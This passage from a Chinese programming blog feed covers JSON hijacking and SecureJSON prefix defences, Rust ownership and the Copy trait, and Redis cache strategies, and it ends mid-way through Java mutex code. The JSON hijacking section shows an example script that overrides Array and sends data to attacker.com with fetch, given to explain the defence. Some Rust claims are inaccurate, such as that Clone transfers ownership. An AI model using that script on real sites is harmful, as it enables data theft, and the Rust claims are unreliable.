<li><p><strong><code>&lt;script&gt;</code> 标签的跨域特性</strong><br>浏览器允许通过 <code>&lt;script src=&quot;...&quot;&gt;</code> 加载跨域脚本，但默认无法直接读取响应内容。</p>
</li>
<li><p><strong>覆盖 JavaScript 内置对象</strong><br>攻击者可以覆盖 <code>Array</code> 构造函数或 <code>Object.defineProperty</code>，在 JSON 数据解析时触发恶意代码。  </p>
<ul>
<li><p><strong>示例</strong>：  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意网站覆盖 Array 构造函数</span></span><br><span class="line">  <span class="keyword">var</span> originalArray = <span class="title class_">Array</span>;</span><br><span class="line">  <span class="title class_">Array</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title function_">originalArray</span>();</span><br><span class="line">    arr.<span class="property">push</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="comment">// 窃取数据并发送到攻击者服务器</span></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com?data=&#x27;</span> + value);</span><br><span class="line">      <span class="keyword">return</span> originalArray.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, value);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 加载目标网站的 <span class="title class_">JSON</span> 数据 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 <code>data.json</code> 返回 <code>[&#123;&quot;id&quot;: 1&#125;]</code>，浏览器会将其解析为数组，触发被覆盖的 <code>Array</code> 构造函数，导致数据泄露。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、SecureJSON-如何防御-JSON-劫持？"><a href="#三、SecureJSON-如何防御-JSON-劫持？" class="headerlink" title="三、SecureJSON 如何防御 JSON 劫持？"></a><strong>三、SecureJSON 如何防御 JSON 劫持？</strong></h3><p>SecureJSON 的核心思想是<strong>破坏 JSON 数据的直接解析</strong>，使其无法被攻击者利用。以下是具体手段：</p>
<h4 id="1-添加无害前缀"><a href="#1-添加无害前缀" class="headerlink" title="1. 添加无害前缀"></a>1. <strong>添加无害前缀</strong></h4><p>   服务器在返回 JSON 数据前，添加一段无法被 JavaScript 直接解析的前缀。  </p>
<ul>
<li><p><strong>示例</strong>：  </p>
   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;id&quot;: 1&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>作用</strong>：当浏览器通过 <code>&lt;script&gt;</code> 标签加载此数据时，前缀会导致语法错误，阻止后续脚本执行。</p>
</li>
</ul>
<h4 id="2-强制非数组格式"><a href="#2-强制非数组格式" class="headerlink" title="2. 强制非数组格式"></a>2. <strong>强制非数组格式</strong></h4><p>   将 JSON 数据包装为非数组形式（如对象），避免触发 <code>Array</code> 构造函数。  </p>
<ul>
<li><p><strong>示例</strong>：  </p>
   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>作用</strong>：攻击者需要访问 <code>data</code> 属性才能获取数组，而由于同源策略限制，跨域脚本无法直接读取对象的属性。</p>
</li>
</ul>
<h4 id="3-结合内容类型（Content-Type）"><a href="#3-结合内容类型（Content-Type）" class="headerlink" title="3. 结合内容类型（Content-Type）"></a>3. <strong>结合内容类型（Content-Type）</strong></h4><p>   服务器设置响应头 <code>Content-Type: application/json</code>，明确告知浏览器这是 JSON 数据（而非可执行的 JavaScript）。  </p>
<ul>
<li><strong>现代浏览器</strong>：会拒绝通过 <code>&lt;script&gt;</code> 标签执行非 <code>application/javascript</code> 类型的内容。</li>
</ul>
<hr>
<h3 id="四、SecureJSON-防御流程"><a href="#四、SecureJSON-防御流程" class="headerlink" title="四、SecureJSON 防御流程"></a><strong>四、SecureJSON 防御流程</strong></h3><ol>
<li><p><strong>攻击者尝试通过 <code>&lt;script&gt;</code> 加载 JSON 数据</strong>  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器返回 SecureJSON 格式数据</strong>  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;data&quot;: [&#123;&quot;id&quot;: 1&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>浏览器解析失败</strong>  </p>
<ul>
<li>前缀 <code>)]&#125;&#39;</code> 导致语法错误，后续数据无法执行。</li>
<li>即使攻击者尝试覆盖内置对象，也无法触发恶意代码。</li>
</ul>
</li>
<li><p><strong>合法前端代码处理 SecureJSON</strong>  </p>
<ul>
<li><p>前端需要手动移除前缀并解析 JSON：  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://victim.com/data.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text.<span class="title function_">replace</span>(<span class="regexp">/^\)\]\&#125;&#x27;/</span>, <span class="string">&#x27;&#x27;</span>)));</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>关键点</strong>：只有合法前端知道如何处理 SecureJSON 格式，攻击者无法利用自动解析机制。</p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、同源策略的补充作用"><a href="#五、同源策略的补充作用" class="headerlink" title="五、同源策略的补充作用"></a><strong>五、同源策略的补充作用</strong></h3><ul>
<li><strong>限制跨域数据读取</strong>：即使攻击者绕过 SecureJSON，同源策略仍会阻止恶意脚本直接读取响应内容。</li>
<li><strong>CORS（跨域资源共享）</strong>：现代浏览器通过 CORS 进一步限制跨域请求，要求服务器显式允许跨域访问。</li>
</ul>
<hr>
<h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a><strong>六、总结</strong></h3><p>SecureJSON 通过以下方式防止 JSON 劫持：</p>
<ol>
<li><strong>破坏直接解析</strong>：添加前缀或包装数据，使恶意脚本无法自动触发解析。</li>
<li><strong>依赖同源策略</strong>：结合浏览器安全机制，阻止跨域脚本读取数据。</li>
<li><strong>强制合法前端处理</strong>：只有已知的前端代码能正确处理 SecureJSON 格式。</li>
</ol>
<p>这种方法在兼容旧浏览器的同时，有效防御了 JSON 劫持攻击，是 Web 安全中一种经典的“无害化”设计思路。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><p><a href="https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses#:~:text=In%20the%20most%20simple%20terms,key%20will%20be%20consistently%20dismissed">Why does Google prepend while(1); to their JSON responses?</a></p>
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>rust-ownership的分析</title>
    <url>/2025/03/07/rust-ownership%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="Rust-Ownership-的基本概念"><a href="#Rust-Ownership-的基本概念" class="headerlink" title="Rust Ownership 的基本概念"></a>Rust Ownership 的基本概念</h2><h3 id="1-什么是所有权（Ownership）？"><a href="#1-什么是所有权（Ownership）？" class="headerlink" title="1. 什么是所有权（Ownership）？"></a>1. 什么是所有权（Ownership）？</h3><p>所有权是 Rust 的核心概念之一，用于管理内存的分配和释放。在 Rust 中，每个值都有一个对应的所有者，所有者负责释放其值的内存。当所有者离开作用域时，其值将被自动释放。</p>
<h3 id="2-所有权规则"><a href="#2-所有权规则" class="headerlink" title="2. 所有权规则"></a>2. 所有权规则</h3><p>Rust 的所有权规则如下：</p>
<ol>
<li>每个值都有一个对应的所有者。</li>
<li>一个值只能有一个所有者。</li>
<li>当所有者离开作用域时，其值将被释放。</li>
</ol>
<h3 id="3-所有权的优势"><a href="#3-所有权的优势" class="headerlink" title="3. 所有权的优势"></a>3. 所有权的优势</h3><p>所有权机制有以下优势：</p>
<ul>
<li><strong>内存安全</strong>：避免了内存泄漏和悬空指针等问题。</li>
<li><strong>无需 GC</strong>：不需要垃圾回收器，避免了 GC 带来的性能开销。</li>
<li><strong>并发安全</strong>：避免了数据竞争和多线程问题。</li>
<li><strong>代码简洁</strong>：避免了手动内存管理的复杂性。</li>
<li><strong>性能优越</strong>：避免了 GC 的停顿和内存碎片问题。</li>
<li><strong>更好的错误检查</strong>：避免了空指针和野指针等问题。</li>
<li><strong>更好的代码质量</strong>：避免了内存泄漏和内存溢出等问题。</li>
<li><strong>更好的可维护性</strong>：避免了内存管理的繁琐和复杂性。</li>
<li><strong>更好的可读性</strong>：避免了手动内存管理的细节和陷阱。</li>
</ul>
<h2 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h2><h3 id="1-所有权的转移"><a href="#1-所有权的转移" class="headerlink" title="1. 所有权的转移"></a>1. 所有权的转移</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1; <span class="comment">// s1 ownership is moved to s2</span></span><br><span class="line">    <span class="comment">// println!(&quot;&#123;&#125;&quot;, s1); // error: ownership of s1 is moved to s2</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>s1</code> 的所有权被转移到 <code>s2</code>，因此 <code>s1</code> 无法再使用。这是因为 Rust 不允许多个所有者同时拥有同一个值，以避免出现悬空指针和内存泄漏等问题。</p>
<h3 id="2-所有权的借用"><a href="#2-所有权的借用" class="headerlink" title="2. 所有权的借用"></a>2. 所有权的借用</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x: &#123;&#125;&quot;</span>, x); <span class="comment">// x is still valid because it is not moved but borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>y</code> 借用了 <code>x</code> 的所有权，但并没有转移。因此 <code>x</code> 仍然有效，可以继续使用。这种方式避免了所有权的转移，同时允许多个引用同时访问同一个值。</p>
<h3 id="3-所有权的引用"><a href="#3-所有权的引用" class="headerlink" title="3. 所有权的引用"></a>3. 所有权的引用</h3><h4 id="3-1-不可变引用"><a href="#3-1-不可变引用" class="headerlink" title="3.1 不可变引用"></a>3.1 不可变引用</h4><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>b</code> 是 <code>a</code> 的不可变引用，因此 <code>a</code> 仍然有效，可以继续使用。不可变引用的特点是：</p>
<ul>
<li>可以有多个不可变引用。</li>
<li>不可变引用使用期间，原变量可继续使用。</li>
<li>不可变引用使用后，原变量可继续使用。</li>
</ul>
<h4 id="3-2-可变引用"><a href="#3-2-可变引用" class="headerlink" title="3.2 可变引用"></a>3.2 可变引用</h4><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// when mut reference is used</span></span><br><span class="line">    <span class="comment">// original variable is borrowed</span></span><br><span class="line">    <span class="comment">// only one mutable reference is allowed</span></span><br><span class="line">    <span class="comment">// and only when the borrowed variable is not used</span></span><br><span class="line">    <span class="comment">// we can then use the original variable</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!(&quot;The value of a is: &#123;&#125;&quot;, a);  // error: a cannot be used while b is borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    *b += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a); <span class="comment">// now a can be used</span></span><br><span class="line">    <span class="comment">// println!(&quot;The value of b is: &#123;&#125;&quot;, b); // if this line is uncommented, it will throw an error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个示例中，<code>b</code> 是 <code>a</code> 的可变引用，因此 <code>a</code> 在 <code>b</code> 使用期间不可使用。只有当 <code>b</code> 使用完毕后，<code>a</code> 才能继续使用。</p>
<p>可变引用的使用规则如下：</p>
<ul>
<li>只能有一个可变引用。</li>
<li>可变引用使用期间，原变量不可使用。</li>
<li>可变引用使用后，原变量可继续使用。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Rust 让人省心…</p>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>rust-copy_trait的分析</title>
    <url>/2025/03/07/rust-copy-trait%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="Rust-Copy-Trait-的基本概念"><a href="#Rust-Copy-Trait-的基本概念" class="headerlink" title="Rust Copy Trait 的基本概念"></a>Rust Copy Trait 的基本概念</h2><h3 id="1-什么是-Copy-Trait？"><a href="#1-什么是-Copy-Trait？" class="headerlink" title="1. 什么是 Copy Trait？"></a>1. 什么是 Copy Trait？</h3><p>Copy Trait 是 Rust 的一个特性，用于标记可以通过简单的位拷贝（bitwise copy）来复制的类型。具有 Copy Trait 的类型在赋值、传递参数等操作时，会自动复制其值，而不会转移所有权。</p>
<h3 id="2-Copy-Trait-的规则"><a href="#2-Copy-Trait-的规则" class="headerlink" title="2. Copy Trait 的规则"></a>2. Copy Trait 的规则</h3><p>Rust 中的 Copy Trait 规则如下：</p>
<ol>
<li>实现 Copy Trait 的类型必须是基本数据类型（如整数、浮点数、布尔值等）或者包含基本数据类型的元组（Tuple）。</li>
<li>实现 Copy Trait 的类型在赋值、传递参数等操作时，会自动复制其值，而不会转移所有权。</li>
<li>实现 Copy Trait 的类型不会调用 <code>Drop</code> Trait 的 <code>drop</code> 方法，因为它们的值是通过简单的位拷贝来复制的。</li>
</ol>
<h3 id="3-Copy-Trait-的优势"><a href="#3-Copy-Trait-的优势" class="headerlink" title="3. Copy Trait 的优势"></a>3. Copy Trait 的优势</h3><p>Copy Trait 机制有以下优势：</p>
<ul>
<li><strong>性能优化</strong>：避免了不必要的内存分配和释放。</li>
<li><strong>代码简洁</strong>：避免了所有权转移和借用的复杂性。</li>
<li><strong>更好的可读性</strong>：明确了值的复制行为，减少了代码的歧义性。</li>
<li><strong>更好的错误检查</strong>：避免了悬空指针和内存泄漏等问题。</li>
<li><strong>更好的代码质量</strong>：避免了内存管理的繁琐和复杂性。</li>
<li><strong>更好的可维护性</strong>：避免了内存管理的细节和陷阱。</li>
<li><strong>更好的性能表现</strong>：避免了不必要的内存分配和释放。</li>
</ul>
<h3 id="4-实现-Copy-Trait-的类型"><a href="#4-实现-Copy-Trait-的类型" class="headerlink" title="4. 实现 Copy Trait 的类型"></a>4. 实现 Copy Trait 的类型</h3><p>Rust 中的基本数据类型和元组等类型都实现了 Copy Trait，例如：</p>
<ul>
<li>整数类型（<code>i32</code>、<code>u32</code> 等）</li>
<li>浮点数类型（<code>f32</code>、<code>f64</code> 等）</li>
<li>布尔类型（<code>bool</code>）</li>
<li>字符类型（<code>char</code>）</li>
<li>元组类型（<code>(T1, T2, ...)</code>）</li>
<li>数组类型（<code>[T; N]</code>）</li>
<li>等等</li>
</ul>
<p>注意，String、Vec 等类型不具有 Copy Trait，因为它们的值是通过堆分配来管理的，需要转移所有权来复制值。</p>
<h2 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!(&quot;The value of s1 is: &#123;&#125;&quot;, s1); // error: value borrowed here after move</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of s2 is: &#123;&#125;&quot;</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>x</code> 是一个整数类型，具有 Copy Trait，因此可以通过简单的位拷贝来复制其值。而 <code>s1</code> 是一个字符串类型，不具有 Copy Trait，因此在赋值给 <code>s2</code> 后，<code>s1</code> 的所有权被转移，无法再使用。这种行为避免了悬空指针和内存泄漏等问题，提高了代码的安全性和可靠性。</p>
<h2 id="Copy-Trait-和-Clone-Trait-的区别"><a href="#Copy-Trait-和-Clone-Trait-的区别" class="headerlink" title="Copy Trait 和 Clone Trait 的区别"></a>Copy Trait 和 Clone Trait 的区别</h2><p>Copy Trait 和 Clone Trait 都用于复制值，但有以下区别：</p>
<ul>
<li>Copy Trait 适用于基本数据类型和元组等类型，通过简单的位拷贝来复制值，不会转移所有权。</li>
<li>Clone Trait 适用于所有类型，通过调用 <code>clone</code> 方法来复制值，会转移所有权，但是可以自定义复制行为。</li>
</ul>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-缓存</title>
    <url>/2025/03/16/Redis-%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><p>Redis 全称 Remote Dictionary Server，即远程字典服务器。是一个基于内存的键值型NoSQL数据库，支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。Redis 是一个高性能的 key-value 存储系统，常用于缓存、消息队列、排行榜等场景。</p>
<h2 id="Redis-特点"><a href="#Redis-特点" class="headerlink" title="Redis 特点"></a>Redis 特点</h2><ul>
<li><strong>键值存储</strong>：Redis 是一个键值存储系统，支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。</li>
<li><strong>单线程</strong>：Redis 是单线程的，通过非阻塞 I&#x2F;O 和事件驱动机制来实现高并发，每个命令具备原子性。</li>
<li><strong>低延迟</strong>：Redis 通过将数据存储在内存中来实现低延迟。</li>
<li><strong>持久化</strong>：Redis 支持 RDB 和 AOF 两种持久化方式，可以将内存中的数据持久化到磁盘中。</li>
<li><strong>支持集群</strong>：Redis 支持主从复制、哨兵和集群等功能。</li>
<li><strong>支持多语言</strong>：Redis 支持多种语言的客户端，如 Java、Python、Node.js 等。</li>
</ul>
<h2 id="Redis-安装"><a href="#Redis-安装" class="headerlink" title="Redis 安装"></a>Redis 安装</h2><p>官网下载地址：<a href="https://redis.io/download">https://redis.io/download</a></p>
<h2 id="Redis-命令"><a href="#Redis-命令" class="headerlink" title="Redis 命令"></a>Redis 命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure>

<h2 id="Redis-缓存"><a href="#Redis-缓存" class="headerlink" title="Redis 缓存"></a>Redis 缓存</h2><h3 id="缓存作用模型"><a href="#缓存作用模型" class="headerlink" title="缓存作用模型"></a>缓存作用模型</h3><p><img src="/images/image6.png" alt="alt text"></p>
<h3 id="缓存更新策略"><a href="#缓存更新策略" class="headerlink" title="缓存更新策略"></a>缓存更新策略</h3><p><img src="/images/image7.png" alt="alt text"></p>
<h4 id="主动更新策略"><a href="#主动更新策略" class="headerlink" title="主动更新策略"></a>主动更新策略</h4><ol>
<li>由缓存的调用者，在更新数据库的同时，更新缓存。</li>
<li>将缓存和数据库整合为一个服务，由服务来维护统一性。</li>
<li>调用者只操作缓存，由其他线程异步的将缓存数据持久化到数据库。</li>
</ol>
<p>一般采用第一种方案，即在更新数据库的同时，更新缓存。</p>
<p>方案二会导致缓存和数据库的耦合度过高，不利于系统的扩展和维护。</p>
<p>方案三会可能导致缓存数据和数据库数据不一致，不利于数据的一致性。</p>
<h4 id="缓存更新策略的最佳实践方案"><a href="#缓存更新策略的最佳实践方案" class="headerlink" title="缓存更新策略的最佳实践方案"></a>缓存更新策略的最佳实践方案</h4><ol>
<li>低一致性需求：使用Redis自带的内存淘汰机制</li>
<li>高一致性需求：主动更新，并以超时剔除作为兜底策略</li>
</ol>
<p><img src="/images/image8.png" alt="alt text"></p>
<ul>
<li>读操作<ul>
<li>缓存命中则直接返回</li>
<li>缓存未命中则查询数据库，并写入缓存，设定超时时间</li>
</ul>
</li>
<li>写操作<ul>
<li>先写数据库，再删除缓存</li>
<li>要确保数据库与缓存操作的原子性</li>
</ul>
</li>
</ul>
<p><img src="/images/image9.png" alt="alt text"></p>
<p>ps. 缓存为快速操作，可能会在数据库写入之前读取到脏数据，造成线程安全问题;之所以不选择更新缓存，因为更新操作相比删除操作，会带来更多无用操作。</p>
<h3 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h3><p>缓存穿透是指客户端请求的数据在缓存和数据库中都不存在，这样缓存永远不会命中，导致请求直接访问数据库，增加数据库的压力。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p><img src="/images/image10.png" alt="alt text"></p>
<ol>
<li><strong>缓存空对象</strong></li>
</ol>
<ul>
<li>实现简单， 维护成本低</li>
<li>额外的内存开销（可以设置较短的过期时间）</li>
<li>可能造成短期的不一致（当有新的数据插入时，造成数据不一致）</li>
</ul>
<ol start="2">
<li><strong>布隆过滤器</strong></li>
</ol>
<ul>
<li>一个很长的二进制向量和一系列随机映射函数</li>
<li>内存占用少，没有多余key</li>
<li>有一定的误判率（不存在是真的不存在，存在是可能存在）</li>
</ul>
<ol start="3">
<li><strong>增强id复杂度</strong></li>
</ol>
<ul>
<li>对id进行加密，增加复杂度</li>
<li>一定程度上可以防止穿透</li>
</ul>
<ol start="4">
<li><strong>限流</strong></li>
</ol>
<ul>
<li>限制请求频率，防止攻击</li>
</ul>
<p>一般在开发中，会使用第一种方案，即缓存空对象。</p>
<p>流程图变化：</p>
<p><img src="/images/image11.png" alt="alt text"></p>
<h3 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h3><p>缓存雪崩是指缓存中的大量数据同时过期或者Redis服务宕机，导致请求直接访问数据库，增加数据库的压力。</p>
<h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
<li><strong>缓存数据过期时间随机</strong></li>
</ol>
<ul>
<li>给不同的key的TTL设置随机值，避免大量key同时过期</li>
</ul>
<ol start="2">
<li><p><strong>多级缓存</strong></p>
</li>
<li><p><strong>Redis集群</strong></p>
</li>
</ol>
<ul>
<li>通过主从复制和哨兵机制，保证Redis的高可用性</li>
</ul>
<ol start="4">
<li><strong>限流</strong></li>
</ol>
<p><img src="/images/image12.png" alt="alt text"></p>
<h3 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h3><p><img src="/images/image13.png" alt="alt text"></p>
<p>缓存击穿问题也叫热点Key问题，是指一个被高并发访问且缓存重建业务较复杂的Key突然失效，导致大量请求瞬间访问数据库，增加数据库的压力。</p>
<h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><ol>
<li><strong>互斥锁</strong></li>
</ol>
<ul>
<li>在缓存失效的时候，使用互斥锁，只允许一个线程访问数据库，其他线程等待</li>
<li>适用于缓存失效后，数据重建时间较短的情况</li>
</ul>
<ol start="2">
<li><strong>逻辑过期</strong></li>
</ol>
<ul>
<li>设置一个逻辑上不会过期的缓存，当逻辑过期时，重新设置缓存</li>
<li>某个线程设置缓存时，其他线程直接得到缓存数据，不考虑缓存是否过期</li>
</ul>
<p><img src="/images/image14.png" alt="alt text"></p>
<p><img src="/images/image15.png" alt="alt text"></p>
<p>使用互斥锁来解决：</p>
<p><img src="/images/image16.png" alt="alt text"></p>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">queryById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">// 互斥锁解决缓存击穿</span></span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> queryWithMutex(id);</span><br><span class="line">    <span class="keyword">if</span> (shop == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;商铺不存在&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Result.ok(shop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 互斥锁解决缓存击穿</span></span><br><span class="line"><span class="keyword">public</span> Shop <span class="title function_">queryWithMutex</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> CACHE_SHOP_KEY + id;</span><br><span class="line">    <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">shopJson</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 如果缓存中有数据，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (StrUtil.isNotBlank(shopJson)) &#123; <span class="comment">// 是真实商铺数据才会进入if返回数据</span></span><br><span class="line">        <span class="keyword">return</span> JSONUtil.toBean(shopJson, Shop.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断命中的是否为空值</span></span><br><span class="line">    <span class="keyword">if</span> (shopJson != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 未命中 实现缓存重建</span></span><br><span class="line">    <span class="comment">// 获取互斥锁</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(LOCK_SHOP_KEY + id);</span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 判断是否获取成功</span></span><br><span class="line">        <span class="keyword">if</span> (!isLock) &#123;</span><br><span class="line">            <span class="comment">// 未获取到锁，休眠后重试</span></span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">return</span> queryWithMutex(id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 成功，从数据库中查询</span></span><br><span class="line">        shop = getById(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 